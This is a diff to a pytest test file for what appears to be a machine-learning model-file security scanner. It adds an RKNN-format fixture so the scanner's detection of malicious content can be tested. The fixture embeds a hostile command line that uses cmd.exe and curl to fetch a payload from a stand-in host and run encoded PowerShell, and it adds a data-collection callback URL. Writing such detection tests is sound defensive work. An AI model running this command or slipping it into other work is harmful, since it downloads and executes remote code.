@@ -959,13 +959,19 @@ def test_scan_file_does_not_let_invalid_flax_prefix_mask_malicious_lightgbm(
     )
 
 
-@pytest.mark.parametrize("foreign_format", ["torch7", "cntk", "lightgbm"])
+@pytest.mark.parametrize("foreign_format", ["rknn", "torch7", "cntk", "lightgbm"])
 def test_scan_file_preserves_foreign_findings_in_flax_content_overlap(tmp_path: Path, foreign_format: str) -> None:
     if not flax_msgpack_scanner.HAS_MSGPACK:
         pytest.skip("msgpack unavailable")
 
     payload = tmp_path / f"overlap-{foreign_format}.jpg"
-    if foreign_format == "torch7":
+    if foreign_format == "rknn":
+        payload.write_bytes(
+            b"RKNN\x01\x00\x00\x00"
+            b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
+            b"callback=http://198.51.100.5:8080/collect\n"
+        )
+    elif foreign_format == "torch7":
         payload.write_bytes(
             b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
             b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
@@ -983,6 +989,7 @@ def test_scan_file_preserves_foreign_findings_in_flax_content_overlap(tmp_path: 
 
     assert result.scanner_name == "flax_msgpack"
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+    assert result.bytes_scanned == payload.stat().st_size
 
 
 def test_scan_file_fails_closed_when_flax_overlap_scanner_is_unavailable(
